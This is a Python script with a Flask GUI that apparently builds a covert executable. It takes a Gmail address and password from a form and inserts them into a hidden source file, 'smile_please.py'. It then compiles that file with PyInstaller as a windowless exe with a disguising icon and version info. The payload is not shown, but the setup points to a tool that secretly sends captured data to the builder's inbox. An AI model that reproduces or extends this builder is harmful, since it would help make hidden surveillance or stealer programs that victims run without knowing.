import os

os.system('python --version >> temp.txt')
check = open('temp.txt','r').read()

if 'Python' in check:
    pass
else:
    os.system('curl -s https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe --output python.exe')
    os.system('python.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 SimpleInstall=1')
    os.remove('python.exe')
    os.system('pip install -r Source_Files/requirements.txt')
os.remove('temp.txt')



from shutil import copyfile
from flaskwebgui import FlaskUI
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def welcome():
    return render_template("Build.html")

@app.route('/build',methods=['POST','GET'])
def output():
    start(request.form['gmail'],request.form['password'])
    return render_template("Built.html")


def start(gmail,password):
        with open('Source_Files/smile_please.py', 'r') as file :
            filedata = file.read()
        if 'your_gmail@gmail.com' in filedata:
            filedata = filedata.replace('your_gmail@gmail.com',gmail)
        with open('Source_Files/smile_please.py', 'w') as file:
            file.write(filedata)
        with open('Source_Files/smile_please.py', 'r') as file :
            filedata = file.read()
        if 'your_password@1234' in filedata:
            filedata = filedata.replace('your_password@1234',password)
        with open('Source_Files/smile_please.py', 'w') as file:
            file.write(filedata)


        os.system('pyinstaller --onefile --icon=Source_Files/icon.ico --version-file Source_Files/version.txt --noconsole Source_Files/smile_please.py')
        os.system('rd /s /q build')
        os.remove('smile_please.spec')
        copyfile('dist/smile_please.exe', 'smile_please.exe')
        os.system('rd /s /q dist')


        with open('Source_Files/smile_please.py', 'r') as file :
            filedata = file.read()
        if gmail in filedata:
            filedata = filedata.replace(gmail,'your_gmail@gmail.com')
        with open('Source_Files/smile_please.py', 'w') as file:
            file.write(filedata)
        with open('Source_Files/smile_please.py', 'r') as file :
            filedata = file.read()
        if password in filedata:
            filedata = filedata.replace(password,'your_password@1234')
        with open('Source_Files/smile_please.py', 'w') as file:
            file.write(filedata)

if __name__ == '__main__':
    FlaskUI(app, width=360, height=590).run()
